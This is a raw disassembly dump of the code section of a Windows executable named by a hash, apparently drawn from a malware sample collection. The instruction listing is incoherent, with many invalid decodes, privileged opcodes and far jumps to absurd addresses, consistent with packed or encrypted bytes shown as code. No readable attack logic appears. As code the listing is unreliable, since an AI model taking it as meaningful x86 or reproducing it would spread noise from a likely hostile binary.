
5ac2fa6aae7c73144b5e7c20a2c997b4ba0b4197d846c55b67a95660bd9e7520.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	mov    ecx,edx
  411002:	fsub   st(5),st
  411004:	mov    cl,cl
  411006:	sbb    eax,0xf7a8e6fd
  41100b:	sub    dl,BYTE PTR [ecx+ecx*1]
  41100e:	test   eax,0x8e35d282
  411013:	mov    ah,0xa7
  411015:	aam    0xfa
  411017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411018:	xchg   ebx,eax
  411019:	daa    
  41101a:	jle    0x411005
  41101c:	int3   
  41101d:	sbb    esp,eax
  41101f:	cmp    al,0x52
  411021:	jmp    0x411028
  411023:	push   esi
  411024:	adc    al,0xa3
  411026:	lods   al,BYTE PTR ds:[esi]
  411027:	aaa    
  411028:	sub    ebx,DWORD PTR [esi+edx*4-0x25caa5af]
  41102f:	ret    0x190f
  411032:	aam    0xe0
  411034:	test   al,dl
  411036:	hlt    
  411037:	dec    eax
  411038:	mov    eax,0x9f568428
  41103d:	(bad)  
  41103e:	mov    dh,0xf9
  411040:	fnstenv [edi+0x498fe8bc]
  411046:	mov    ah,0xac
  411048:	add    al,0x27
  41104a:	jbe    0x4110b8
  41104c:	or     eax,0x1205081
  411051:	inc    ecx
  411052:	inc    eax
  411053:	push   ecx
  411054:	iret   
  411055:	pop    ds
  411056:	mov    dl,0xbc
  411058:	cmp    eax,0xd37aee16
  41105d:	or     ebx,ebx
  41105f:	jo     0x4110c4
  411061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411062:	jbe    0x411034
  411064:	cwde   
  411065:	mov    bl,0x97
  411067:	add    esi,ebx
  411069:	fiadd  DWORD PTR [esi+0x593e26d2]
  41106f:	iret   
  411070:	inc    edi
  411071:	cmp    dl,BYTE PTR [esi-0x6c]
  411074:	in     al,0x6a
  411076:	(bad)  
  411077:	push   ebp
  411078:	xchg   esi,eax
  411079:	sti    
  41107a:	adc    ecx,ecx
  41107c:	mov    ah,0xf
  41107e:	jbe    0x4110ec
  411080:	adc    BYTE PTR ss:[ebp+0x48f8397e],ah
  411087:	pop    ss
  411088:	out    dx,al
  411089:	test   eax,0xd964d6af
  41108e:	inc    ebp
  41108f:	mov    esp,0x2789f8a7
  411094:	dec    esi
  411095:	or     eax,0x282a27b7
  41109a:	fnstcw WORD PTR [edx+0x4a555bdf]
  4110a0:	jmp    0x41106b
  4110a2:	add    DWORD PTR [esi+0x31],esp
  4110a5:	ss pop ebp
  4110a7:	enter  0xf577,0x16
  4110ab:	loop   0x411078
  4110ad:	push   ecx
  4110ae:	mov    ch,BYTE PTR [ebp+0x3b]
  4110b1:	dec    edx
  4110b2:	ins    BYTE PTR es:[edi],dx
  4110b3:	rol    DWORD PTR [ebx+0x78f15527],1
  4110b9:	xchg   esi,eax
  4110ba:	push   edx
  4110bb:	push   es
  4110bc:	fs push ebx
  4110be:	push   esi
  4110bf:	retf   0x7c44
  4110c2:	ficomp DWORD PTR [ebx]
  4110c4:	sbb    BYTE PTR [edx],dh
  4110c6:	xor    eax,0x80ea30c
  4110cb:	adc    cl,BYTE PTR [edx+ecx*8]
  4110ce:	fidiv  WORD PTR [ecx-0x100f1450]
  4110d4:	iret   
  4110d5:	jns    0x411062
  4110d7:	mov    esp,0x2afac576
  4110dc:	test   dh,ah
  4110de:	imul   ecx,DWORD PTR [ecx+eiz*8+0xf],0x30
  4110e3:	and    al,0x2a
  4110e5:	sbb    esp,DWORD PTR [esi+ebx*2]
  4110e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110e9:	jecxz  0x411144
  4110eb:	dec    edx
  4110ec:	retf   0xad81
  4110ef:	fsub   DWORD PTR [ecx-0xc]
  4110f2:	jmp    0x679:0xe2ee4b13
  4110f9:	jae    0x4110f2
  4110fb:	sti    
  4110fc:	bound  edi,QWORD PTR [edx-0x76]
  4110ff:	das    
  411100:	xchg   ecx,eax
  411101:	lods   eax,DWORD PTR ds:[esi]
  411102:	dec    edx
  411103:	cli    
  411104:	mov    bh,0xa4
  411106:	push   0x6
  411108:	loope  0x411099
  41110a:	sbb    DWORD PTR [ebx],esi
  41110c:	cmp    bh,BYTE PTR [eiz*1+0x498d4d2f]
  411113:	mov    edx,0x92af02a5
  411118:	call   0x5091649c
  41111d:	sbb    al,0xd6
  411120:	dec    edx
  411121:	push   ebx
  411122:	loopne 0x411150
  411124:	cwde   
  411125:	sub    bh,BYTE PTR [edx-0x63252918]
  41112b:	mov    ecx,0x735857a2
  411130:	ins    BYTE PTR es:[edi],dx
  411131:	std    
  411132:	adc    ah,BYTE PTR ds:0x2af0178f
  411138:	or     BYTE PTR [eax+0x38],dl
  41113b:	sbb    DWORD PTR [ecx-0xb],0x3b
  41113f:	sub    edi,DWORD PTR [edi]
  411141:	cmp    DWORD PTR [edx+eax*2],esi
  411144:	cmp    DWORD PTR [edx+0x49dbe4cd],esi
  41114a:	retf   
  41114b:	push   esp
  41114c:	mov    DWORD PTR [ebx],ecx
  41114e:	push   eax
  41114f:	sub    DWORD PTR [esi+eiz*8+0x57],0x6b
  411154:	jae    0x4111ce
  411156:	adc    ebp,ebp
  411158:	and    DWORD PTR [ebp-0x2d],0xd8dc3eae
  41115f:	in     al,dx
  411160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411161:	add    al,0x35
  411163:	aad    0xf9
  411165:	push   esi
  411166:	popa   
  411167:	adc    DWORD PTR [ecx],ebp
  411169:	pop    es
  41116a:	and    DWORD PTR [ebx],0x7349af7c
  411170:	push   ss
  411171:	cs adc ebx,esi
  411174:	test   DWORD PTR [edi-0x2ae1dd77],esp
  41117a:	push   es
  41117b:	fcmovb st,st(4)
  41117d:	lahf   
  41117e:	in     al,0x9c
  411180:	outs   dx,DWORD PTR ds:[esi]
  411181:	adc    ch,dh
  411183:	mov    ebp,0xa28b91e0
  411188:	test   al,0xcb
  41118a:	pop    edx
  41118b:	das    
  41118c:	sbb    ecx,DWORD PTR [edx+0x59]
  41118f:	inc    esi
  411190:	sbb    ch,BYTE PTR [ebp+edx*4-0x55]
  411194:	mov    dh,0x0
  411196:	jb     0x4111d8
  411198:	test   eax,0x1aa79212
  41119d:	fstp   DWORD PTR [esi-0x16ee181b]
  4111a3:	mov    esi,0x181004c0
  4111a8:	pop    ecx
  4111a9:	push   0xaec2253b
  4111ae:	inc    ecx
  4111af:	idiv   BYTE PTR [esi-0xf]
  4111b2:	std    
  4111b3:	ja     0x411205
  4111b5:	clc    
  4111b6:	rol    DWORD PTR [ebx-0x37],0x73
  4111ba:	imul   edi,DWORD PTR ds:0x17b001de,0x13
  4111c1:	aaa    
  4111c2:	lds    edx,FWORD PTR [eax+eiz*4-0x75]
  4111c6:	push   edi
  4111c7:	aad    0x29
  4111c9:	xchg   ecx,eax
  4111ca:	data16 int 0x2a
  4111cd:	xchg   esp,eax
  4111ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111cf:	rcl    esp,1
  4111d1:	aaa    
  4111d2:	sbb    bl,BYTE PTR [eax]
  4111d4:	mov    gs,ebp
  4111d6:	fild   WORD PTR [ebp-0x70]
  4111d9:	and    esi,eax
  4111db:	add    BYTE PTR [edx+0x3a],ch
  4111de:	or     esi,DWORD PTR [ebx]
  4111e0:	sar    DWORD PTR [ecx-0x19],cl
  4111e3:	push   esp
  4111e4:	or     DWORD PTR [ebp+eiz*2-0x47],edi
  4111e8:	dec    eax
  4111e9:	dec    esi
  4111ea:	fcmovnb st,st(5)
  4111ec:	push   ecx
  4111ed:	repz inc ecx
  4111ef:	cmp    edx,DWORD PTR [ebx]
  4111f1:	jmp    0x7215:0x31c3ad4b
  4111f8:	or     al,0xbe
  4111fa:	push   0x3e
  4111fc:	fld    QWORD PTR [ebx]
  4111fe:	lock inc eax
  411200:	dec    ecx
  411201:	js     0x41123d
  411203:	rcl    DWORD PTR [ebx+0x51d213bb],0xbe
  41120a:	(bad)  
  41120b:	mov    ch,0xa8
  41120d:	fbld   TBYTE PTR [ecx]
  41120f:	mov    al,ds:0x7dd0494a
  411214:	daa    
  411215:	popf   
  411216:	add    dh,BYTE PTR [ecx+0x14]
  411219:	add    eax,0x225731ce
  41121e:	xchg   edi,eax
  41121f:	pop    ebx
  411220:	xor    al,BYTE PTR [edx+ebx*4]
  411223:	jle    0x41124e
  411225:	in     eax,dx
  411226:	fmul   DWORD PTR [eax+0x34655b81]
  41122c:	dec    ebp
  41122d:	icebp  
  41122e:	mov    edi,db7
  411231:	mov    ch,0x8b
  411233:	xchg   ebx,eax
  411234:	popf   
  411235:	cdq    
  411236:	sbb    al,0x5b
  411238:	xor    BYTE PTR [edi],0x46
  41123b:	xchg   esp,eax
  41123c:	loop   0x4112a2
  41123e:	mov    cl,0x91
  411240:	loope  0x4111e8
  411242:	fcmovnb st,st(5)
  411244:	and    ah,ch
  411246:	inc    edx
  411247:	and    al,0xc8
  411249:	push   esi
  41124a:	jns    0x41125e
  41124c:	and    al,0x9b
  41124e:	add    ecx,ebp
  411250:	push   esi
  411251:	test   eax,0x2cc6f3b2
  411256:	pop    esi
  411257:	dec    ecx
  411258:	clc    
  411259:	test   ecx,edi
  41125b:	mov    dh,0x7e
  41125d:	jmp    DWORD PTR [ebx-0x494bbeea]
  411263:	(bad)  
  411264:	not    dh
  411266:	adc    al,0xd0
  411268:	pop    esp
  411269:	test   DWORD PTR [ecx],0xbf8cd7e6
  41126f:	push   esp
  411270:	hlt    
  411271:	jnp    0x41128d
  411273:	mov    eax,0x67b6a8d5
  411278:	adc    bh,0x7f
  41127b:	adc    al,0xb5
  41127d:	xor    bl,ah
  41127f:	out    0x32,eax
  411281:	lods   eax,DWORD PTR ds:[esi]
  411282:	in     eax,0x17
  411284:	call   0x894611d2
  411289:	pop    ds
  41128a:	loop   0x41127d
  41128c:	pop    ds
  41128d:	test   eax,0x5db54691
  411292:	cmp    ch,BYTE PTR [ebx]
  411294:	pop    eax
  411295:	sub    ecx,DWORD PTR [eax-0x1f75944d]
  41129b:	inc    BYTE PTR [eax+0x0]
  41129e:	mov    ds:0xfb3b589d,eax
  4112a3:	adc    eax,0xcb62874b
  4112a8:	outs   dx,DWORD PTR ds:[esi]
  4112a9:	aas    
  4112aa:	mov    ah,0xbc
  4112ac:	cmp    BYTE PTR [eax+0x4f],ah
  4112af:	fs push ebp
  4112b1:	stos   DWORD PTR es:[edi],eax
  4112b2:	mov    ebx,0xe62833b9
  4112b7:	dec    ecx
  4112b8:	retf   0x8837
  4112bb:	rcr    ch,0xbe
  4112be:	mov    BYTE PTR [esi+esi*8-0x52],bh
  4112c2:	or     DWORD PTR [edx],edi
  4112c4:	retf   
  4112c5:	int3   
  4112c6:	sti    
  4112c7:	shl    BYTE PTR [esi+0x43],0xfd
  4112cb:	mov    edi,0xfa6245a3
  4112d0:	mov    dl,0x36
  4112d2:	nop    ebp
  4112d5:	xor    al,0xbf
  4112d7:	in     eax,dx
  4112d8:	pop    edx
  4112d9:	xchg   ebx,eax
  4112da:	enter  0xc13e,0xb6
  4112de:	cmp    cl,BYTE PTR [ebx-0x2e]
  4112e1:	(bad)  
  4112e3:	cmc    
  4112e4:	jnp    0x411273
  4112e6:	ret    
  4112e7:	fld    QWORD PTR [eax]
  4112e9:	mov    eax,0x90afc030
  4112ee:	add    eax,0x9f871c46
  4112f3:	js     0x41128e
  4112f5:	jge    0x4112dd
  4112f7:	es ins BYTE PTR es:[edi],dx
  4112f9:	mov    WORD PTR ds:0x8d5efd05,gs
  4112ff:	out    0x1a,eax
  411301:	push   es
  411302:	adc    BYTE PTR [eax-0x5cd7e67d],dh
  411308:	cdq    
  411309:	xor    esp,esi
  41130b:	adc    al,0x92
  41130d:	enter  0x9fd2,0xe4
  411311:	arpl   bp,bx
  411313:	cmp    eax,0xbe66eeac
  411318:	sub    dh,al
  41131a:	mov    ds:0xe19dab7f,al
  41131f:	je     0x4112bd
  411321:	cmp    DWORD PTR [ebx+ebx*8+0x618b2732],eax
  411328:	mov    al,0x38
  41132a:	nop
  41132b:	pop    edx
  41132c:	add    esp,DWORD PTR [edi-0x32]
  41132f:	mov    al,0xa3
  411331:	push   ss
  411332:	fldcw  WORD PTR [edx]
  411334:	push   esi
  411335:	pop    ss
  411336:	push   edi
  411337:	imul   esp,DWORD PTR [esi+0x3c],0x13
  41133b:	imul   BYTE PTR [esi+0x19]
  41133e:	(bad)  
  41133f:	call   DWORD PTR [ecx]
  411341:	retf   0x9b1a
  411344:	add    bl,dh
  411346:	mov    ecx,0xc193786a
  41134b:	rcl    BYTE PTR [edi+eiz*2],0x9
  41134f:	inc    ebx
  411350:	dec    ebp
  411351:	pop    ss
  411352:	inc    ebx
  411353:	(bad)  [eax-0x74]
  411356:	sbb    edi,DWORD PTR [edi-0x6ca0f90e]
  41135c:	pop    ecx
  41135d:	sub    al,0xe1
  41135f:	das    
  411360:	imul   edi,ebp,0xd133e29
  411366:	inc    ebx
  411367:	bound  ebx,QWORD PTR [ebx-0x38229ee]
  41136d:	xlat   BYTE PTR ds:[ebx]
  41136e:	nop
  41136f:	gs add eax,0xba66b52f
  411375:	xlat   BYTE PTR ds:[ebx]
  411376:	fmul   DWORD PTR [ecx-0x4fa2f069]
  41137c:	(bad)  
  41137d:	inc    BYTE PTR [ecx]
  41137f:	xor    edi,DWORD PTR [esi+0x644216ba]
  411385:	fwait
  411386:	loop   0x4113d2
  411388:	add    BYTE PTR [edi],ah
  41138a:	dec    ecx
  41138b:	cmp    BYTE PTR [edi-0xb7cfc7f],al
  411391:	mov    bh,0x69
  411393:	in     al,dx
  411394:	int    0x28
  411396:	fisttp QWORD PTR [edi-0x2345640d]
  41139c:	add    al,0xf8
  41139e:	in     eax,dx
  41139f:	mov    dh,0x7
  4113a1:	jbe    0x4113da
  4113a3:	jge    0x4113e6
  4113a5:	inc    edi
  4113a6:	xchg   DWORD PTR [edi+ecx*8+0xe],ecx
  4113aa:	add    ebp,DWORD PTR [esi-0x52]
  4113ad:	cmp    DWORD PTR [edi+edi*8-0x4cd3485e],edx
  4113b4:	pushf  
  4113b5:	add    ebx,DWORD PTR [ebx]
  4113b7:	dec    ebx
  4113b8:	iret   
  4113b9:	ds push edx
  4113bb:	in     al,dx
  4113bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113bd:	or     edx,DWORD PTR [edi+0x2b]
  4113c0:	or     al,BYTE PTR [edx]
  4113c2:	add    ch,bh
  4113c4:	jmp    0x5a942d32
  4113c9:	sub    eax,0x4028e9d6
  4113ce:	loop   0x4113fd
  4113d0:	call   edi
  4113d2:	jmp    0x411360
  4113d4:	aaa    
  4113d5:	pop    ebp
  4113d6:	ds jl  0x411414
  4113d9:	enter  0x1dcd,0xe9
  4113dd:	xchg   edi,eax
  4113de:	out    dx,al
  4113df:	mov    ebp,0x8c9be98d
  4113e4:	rcr    BYTE PTR [ebp-0x3e0201cd],1
  4113ea:	sti    
  4113eb:	sbb    eax,0xccd02aa3
  4113f0:	xchg   edi,eax
  4113f1:	retf   0xedbb
  4113f4:	shl    DWORD PTR [eax],cl
  4113f6:	adc    BYTE PTR [esi],bh
  4113f8:	outs   dx,DWORD PTR ds:[esi]
  4113f9:	sub    BYTE PTR [eax],ch
  4113fb:	retf   0xf022
  4113fe:	lock xchg edx,eax
  411400:	jno    0x411397
  411402:	loop   0x41141d
  411404:	and    DWORD PTR [eax-0x18],esi
  411407:	sub    al,BYTE PTR [edx+0x460917bf]
  41140d:	sub    eax,0xd4a46f6c
  411412:	xor    DWORD PTR [edi+esi*4],ebp
  411415:	add    dh,BYTE PTR [ecx+0x6b]
  411418:	aad    0x47
  41141a:	sbb    al,0x5d
  41141c:	push   ebp
  41141d:	loope  0x411418
  41141f:	dec    ebx
  411420:	xchg   ebp,edi
  411422:	mov    ds:0x79fbaefd,al
  411427:	jge    0x411469
  411429:	mov    ebx,0x18633199
  41142e:	cmp    al,0xee
  411430:	out    0x8,eax
  411432:	in     eax,0xeb
  411434:	add    DWORD PTR [esi+ebp*8-0x1297ff60],edx
  41143b:	fs scas eax,DWORD PTR es:[edi]
  41143d:	fdivr  QWORD PTR [esi]
  41143f:	add    bh,bl
  411441:	mov    ecx,0xfbc3ae55
  411446:	and    DWORD PTR ss:[edi+esi*4-0x7b],esi
  41144b:	or     DWORD PTR ds:[eax+0x4a2508e],ebp
  411452:	and    eax,0x1686f418
  411457:	pop    ebp
  411458:	ret    
  411459:	sbb    al,0xaa
  41145b:	(bad)  
  41145c:	mov    ah,0x6c
  41145e:	sub    cl,bh
  411460:	cld    
  411461:	pop    ecx
  411462:	cmp    DWORD PTR [esi+0x42c1dbe3],esp
  411468:	sahf   
  411469:	adc    al,0x87
  41146b:	add    edx,DWORD PTR [edi+0x6d]
  41146e:	xor    ecx,DWORD PTR [ebp-0x7c60ddd3]
  411474:	adc    BYTE PTR [eax],bl
  411476:	xor    dl,al
  411478:	dec    esp
  411479:	test   eax,0x8fdd7040
  41147e:	rcl    BYTE PTR [edi],0x0
  411481:	pop    edx
  411482:	dec    edx
  411483:	cmp    dl,BYTE PTR [eax]
  411485:	or     ecx,DWORD PTR [ebx]
  411487:	push   edi
  411488:	sub    DWORD PTR [edi-0x36],ecx
  41148b:	aas    
  41148c:	daa    
  41148d:	sub    BYTE PTR [ebx-0x2625a358],dl
  411493:	(bad)  
  411494:	(bad)  
  411495:	ja     0x4114c0
  411497:	icebp  
  411498:	jns    0x4114cf
  41149a:	fadd   DWORD PTR [edi-0xca4c477]
  4114a0:	xor    eax,0x6b645417
  4114a5:	(bad)  
  4114a6:	(bad)  
  4114a7:	pop    ds
  4114a8:	xor    ebp,DWORD PTR [eax+0x385b42da]
  4114ae:	clc    
  4114af:	icebp  
  4114b0:	push   cs
  4114b1:	test   DWORD PTR ds:0xeaaa02fc,eax
  4114b7:	fisubr WORD PTR [edx+eax*1]
  4114ba:	sub    esi,edx
  4114bc:	test   BYTE PTR [esp+edi*8],ah
  4114bf:	scas   eax,DWORD PTR es:[edi]
  4114c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114c1:	hlt    
  4114c2:	frstor [esi+0x28]
  4114c5:	push   0x71f52c84
  4114ca:	es das 
  4114cc:	jno    0x411505
  4114ce:	addr16 aas 
  4114d0:	sbb    DWORD PTR [edi],edi
  4114d2:	(bad)  
  4114d3:	(bad)  [ecx+ebx*8]
  4114d6:	retf   0x7c1f
  4114d9:	xor    bh,BYTE PTR [esi+0x443a72ad]
  4114df:	ret    
  4114e0:	sub    cl,0x38
  4114e3:	out    dx,al
  4114e4:	xor    esp,eax
  4114e6:	sub    eax,0xdcf3b858
  4114eb:	cld    
  4114ec:	or     eax,0x5016a179
  4114f1:	repz out 0xed,eax
  4114f4:	cli    
  4114f5:	fs mov bl,0x82
  4114f8:	jg     0x411492
  4114fa:	out    dx,eax
  4114fb:	cmp    BYTE PTR [edi+0x29],ah
  4114fe:	sbb    al,0xd3
  411500:	sub    al,0xd5
  411502:	add    al,0x74
  411504:	jecxz  0x41148d
  411506:	sub    al,BYTE PTR [edx+0x44a5e803]
  41150c:	mov    bh,0x38
  41150e:	gs enter 0xc510,0x5f
  411513:	pop    esi
  411514:	test   al,0xc4
  411516:	jnp    0x411574
  411518:	mov    eax,ds:0x72ef8bbe
  41151d:	mov    ecx,0x2d7ac7b4
  411522:	add    DWORD PTR [ebp-0x524f2628],ebp
  411528:	pop    eax
  411529:	mov    cl,0x71
  41152b:	dec    ebx
  41152c:	(bad)  
  41152d:	xlat   BYTE PTR ds:[ebx]
  41152e:	xor    edx,DWORD PTR [esi]
  411530:	pop    es
  411531:	adc    edi,ebp
  411533:	sbb    al,0x84
  411535:	shr    ah,1
  411537:	sbb    dl,ah
  411539:	jno    0x4114c5
  41153b:	aas    
  41153c:	pop    ds
  41153d:	leave  
  41153e:	pushf  
  41153f:	inc    DWORD PTR [edi+0xb]
  411542:	or     ebx,DWORD PTR [esp+edx*8-0x3643a2b3]
  411549:	jnp    0x411556
  41154b:	and    ch,BYTE PTR [edx-0xc8aeb2d]
  411551:	sub    dh,BYTE PTR [edx-0x48]
  411554:	(bad)  
  411555:	in     al,dx
  411556:	cmp    eax,0x4dd0981c
  41155b:	fs pop es
  41155d:	addr16 jne 0x4114f9
  411560:	jbe    0x4115d6
  411562:	and    ecx,DWORD PTR [esi-0x61875399]
  411568:	sub    al,0x90
  41156a:	xchg   esi,eax
  41156b:	dec    eax
  41156c:	adc    al,0x2a
  41156e:	jb     0x4115ab
  411570:	sub    eax,0x5ad3b4ca
  411575:	in     al,0x8d
  411577:	inc    edi
  411578:	je     0x41155e
  41157a:	cmp    al,0xf2
  41157c:	js     0x41150c
  41157e:	pop    ebx
  41157f:	xor    ah,BYTE PTR [edi-0x6af022d6]
  411585:	xor    esi,esp
  411587:	pusha  
  411588:	ror    DWORD PTR [edx],1
  41158a:	jb     0x411515
  41158c:	lods   eax,DWORD PTR ds:[esi]
  41158d:	into   
  41158e:	xchg   DWORD PTR [edx],esp
  411590:	xchg   DWORD PTR [ecx-0x1206dc4f],edi
  411596:	call   0xb717:0xcf19a794
  41159d:	dec    ebp
  41159e:	xchg   edi,eax
  41159f:	lods   eax,DWORD PTR ds:[esi]
  4115a0:	(bad)  
  4115a1:	or     ebp,DWORD PTR [ebx+esi*8-0x2eb5e2d2]
  4115a8:	aam    0x94
  4115aa:	lods   al,BYTE PTR ds:[esi]
  4115ab:	loope  0x411571
  4115ad:	and    BYTE PTR [eax],ch
  4115af:	pushf  
  4115b0:	and    al,0x3e
  4115b2:	ret    
  4115b3:	leave  
  4115b4:	mov    ebp,0xacdd765b
  4115b9:	repz jp 0x411570
  4115bc:	mov    BYTE PTR [eax-0x6d],ch
  4115bf:	out    0x6f,eax
  4115c1:	push   esp
  4115c3:	mov    al,ds:0xc1c4a9aa
  4115c8:	add    al,0x81
  4115ca:	pushf  
  4115cb:	xor    cl,bl
  4115cd:	xchg   DWORD PTR ds:0x51d25b7f,ebp
  4115d3:	retf   
  4115d4:	inc    dl
  4115d6:	ins    BYTE PTR es:[edi],dx
  4115d7:	adc    DWORD PTR [edi],ecx
  4115d9:	pop    ecx
  4115da:	in     eax,dx
  4115db:	xchg   edx,eax
  4115dc:	pusha  
  4115dd:	(bad)  
  4115df:	daa    
  4115e0:	ret    
  4115e1:	femms  
  4115e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115e4:	or     DWORD PTR [ecx+ebx*8],esp
  4115e7:	or     DWORD PTR [edx+esi*2-0x5],ebx
  4115eb:	sbb    al,0xdd
  4115ed:	ret    0x70fb
  4115f0:	jg     0x4115a8
  4115f2:	and    al,BYTE PTR ss:[esi-0x49e1d125]
  4115f9:	mov    ebx,0x91fd5905
  4115fe:	fidiv  DWORD PTR [ebx-0x32]
  411601:	retf   0xfcd
  411604:	jg     0x411617
  411606:	(bad)  
  411607:	sub    eax,0x945e745f
  41160c:	or     ecx,esp
  41160e:	das    
  41160f:	retfw  0x57bc
  411613:	xor    al,0x92
  411615:	lods   al,BYTE PTR ds:[esi]
  411616:	sbb    al,0x3e
  411618:	xchg   BYTE PTR [ecx+0x715a2a00],ch
  41161e:	test   DWORD PTR [esp+ebx*8],ebp
  411621:	aam    0xaa
  411623:	jo     0x4115e9
  411625:	cmc    
  411626:	jp     0x4115be
  411628:	xor    DWORD PTR ds:[ebx+0x78],edi
  41162c:	adc    DWORD PTR [eax-0x5031f9fa],0xffffffbd
  411633:	cmp    eax,0xbed94d6b
  411638:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41163a:	adc    eax,0xce810895
  41163f:	int3   
  411640:	sbb    ebp,ebx
  411642:	sbb    cl,0xfe
  411645:	icebp  
  411646:	aam    0x15
  411648:	xor    al,0x96
  41164a:	inc    esi
  41164b:	xor    al,BYTE PTR [eax-0x4cd55df9]
  411651:	(bad)  
  411652:	ins    DWORD PTR es:[edi],dx
  411653:	stc    
  411654:	push   es
  411655:	xlat   BYTE PTR ds:[ebx]
  411656:	not    BYTE PTR [ebx+0xa3983c0]
  41165c:	lods   al,BYTE PTR ds:[esi]
  41165d:	jge    0x41160d
  41165f:	shr    DWORD PTR [ebx],cl
  411661:	xchg   esp,eax
  411662:	outs   dx,DWORD PTR ds:[esi]
  411663:	jae    0x411603
  411665:	jne    0x4115fc
  411667:	aad    0x28
  411669:	add    al,0xa1
  41166b:	stos   DWORD PTR es:[edi],eax
  41166c:	push   esi
  41166d:	sbb    dl,BYTE PTR [esp+ebp*4+0x5fda5982]
  411674:	push   cs
  411675:	lea    esi,[ecx-0x2f]
  411678:	mov    al,0x1
  41167a:	xor    BYTE PTR [edi],0x87
  41167d:	mov    bl,0xf4
  41167f:	add    ebp,DWORD PTR [esi]
  411681:	dec    esp
  411682:	lds    esi,FWORD PTR [edx+edi*2-0x6e06a837]
  411689:	addr16 push edi
  41168b:	scas   al,BYTE PTR es:[edi]
  41168c:	retf   0xd570
  41168f:	push   edi
  411690:	loop   0x411660
  411692:	push   ds
  411693:	jecxz  0x411627
  411695:	and    eax,0xa1947419
  41169a:	ss sub ebp,esp
  41169d:	push   edx
  41169e:	cwde   
  41169f:	dec    edi
  4116a0:	xor    eax,DWORD PTR [ebx-0x686a3cce]
  4116a6:	pop    es
  4116a7:	sub    eax,0xcc254351
  4116ac:	mov    ds:0xf9b046d6,al
  4116b1:	(bad)  
  4116b2:	in     eax,0x2e
  4116b4:	mov    al,0x64
  4116b6:	test   DWORD PTR [edx+eiz*8-0x72],edx
  4116ba:	scas   al,BYTE PTR es:[edi]
  4116bb:	mov    ch,0xdc
  4116bd:	out    dx,eax
  4116be:	sbb    ebp,esp
  4116c0:	scas   al,BYTE PTR es:[edi]
  4116c1:	fs aas 
  4116c3:	adc    DWORD PTR [bp+di],esp
  4116c6:	jle    0x41172a
  4116c8:	push   eax
  4116c9:	popa   
  4116ca:	loope  0x4116a1
  4116cc:	scas   al,BYTE PTR es:[edi]
  4116cd:	mov    esp,0xd0fc4cd2
  4116d2:	in     al,dx
  4116d3:	xor    DWORD PTR [ecx-0x19],eax
  4116d6:	mov    al,al
  4116d8:	(bad)  
  4116d9:	fistp  DWORD PTR ds:0x81997da0
  4116df:	jo     0x411729
  4116e1:	mov    cl,0xd1
  4116e3:	dec    ecx
  4116e4:	and    DWORD PTR [edx-0x3c],esi
  4116e7:	or     eax,0x64893b70
  4116ec:	xchg   ebx,eax
  4116ed:	adc    BYTE PTR [eax+0x3],dh
  4116f0:	lea    esi,[eax]
  4116f2:	push   edx
  4116f3:	mov    dl,0x7f
  4116f5:	cmp    al,0x19
  4116f7:	adc    DWORD PTR ds:0x59b45d0e,0xa7f02f1e
  411701:	or     DWORD PTR [eax-0x166bc273],edi
  411707:	jae    0x5c89cfe1
  41170d:	fldcw  WORD PTR [eax+0x3]
  411710:	mov    dh,0x49
  411712:	adc    edi,edi
  411714:	xchg   esi,eax
  411715:	add    BYTE PTR ds:0x13693663,bl
  41171b:	std    
  41171c:	icebp  
  41171d:	pop    esp
  41171e:	jns    0x41171e
  411720:	fucomi st,st(5)
  411722:	fsub   DWORD PTR [ecx]
  411724:	adc    bl,BYTE PTR [edi-0x336f97e0]
  41172a:	pop    ds
  41172b:	(bad)  
  41172c:	or     BYTE PTR [esi-0x25f331f8],dh
  411732:	les    ebp,FWORD PTR [esi+0x8fba9ff]
  411738:	xchg   edx,eax
  411739:	pop    edx
  41173a:	adc    DWORD PTR [eax+0x3a],esp
  41173d:	xchg   esp,eax
  41173e:	inc    edi
  41173f:	mov    esp,DWORD PTR [ebp-0x1e]
  411742:	mov    ch,0xa8
  411744:	mov    edx,0x8a472253
  411749:	fcmovne st,st(5)
  41174b:	sub    ebp,DWORD PTR [eax-0x39]
  41174e:	dec    ebx
  41174f:	inc    ebp
  411750:	jg     0x411757
  411752:	out    dx,eax
  411753:	add    BYTE PTR [esi],ch
  411755:	ss add al,0x4e
  411758:	push   cs
  411759:	out    0x87,al
  41175b:	aaa    
  41175c:	add    dl,BYTE PTR [ecx+0x213bdb43]
  411762:	or     BYTE PTR [ecx+0x5036fbab],cl
  411768:	(bad)  
  411769:	xchg   edi,eax
  41176a:	adc    edx,edi
  41176c:	repnz mov edi,0x8bd65f98
  411772:	pop    ebp
  411773:	add    al,0x7e
  411775:	mov    ah,0xf3
  411777:	imul   esi,DWORD PTR [ebp+0x19],0x45e71b6b
  41177e:	jo     0x411793
  411780:	div    esp
  411782:	popa   
  411783:	jae    0x411745
  411785:	push   ebx
  411786:	or     BYTE PTR gs:[ebp+0x14],bh
  41178a:	call   0x978ac368
  41178f:	jae    0x4117f5
  411791:	test   al,0x7e
  411793:	(bad)  
  411794:	lahf   
  411795:	dec    ecx
  411796:	dec    edx
  411797:	es stos DWORD PTR es:[edi],eax
  411799:	xchg   edx,eax
  41179a:	repz ret 0xa8da
  41179e:	inc    esp
  41179f:	mov    WORD PTR [ebx-0x4f9aeba],ds
  4117a5:	mov    WORD PTR [edx-0x76491d56],ds
  4117ab:	push   edi
  4117ac:	or     eax,0x7aaaafe
  4117b1:	ds mov cl,0x7f
  4117b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117b5:	mov    ebp,0x67300de8
  4117ba:	pushf  
  4117bb:	adc    al,0x86
  4117bd:	and    al,0xf1
  4117bf:	xor    eax,0x7425a64b
  4117c4:	gs add al,0x90
  4117c7:	shr    BYTE PTR [esi],0x74
  4117ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117cb:	sbb    BYTE PTR [ecx-0x1c],dh
  4117ce:	test   eax,0x3660e272
  4117d3:	(bad)  
  4117d4:	sti    
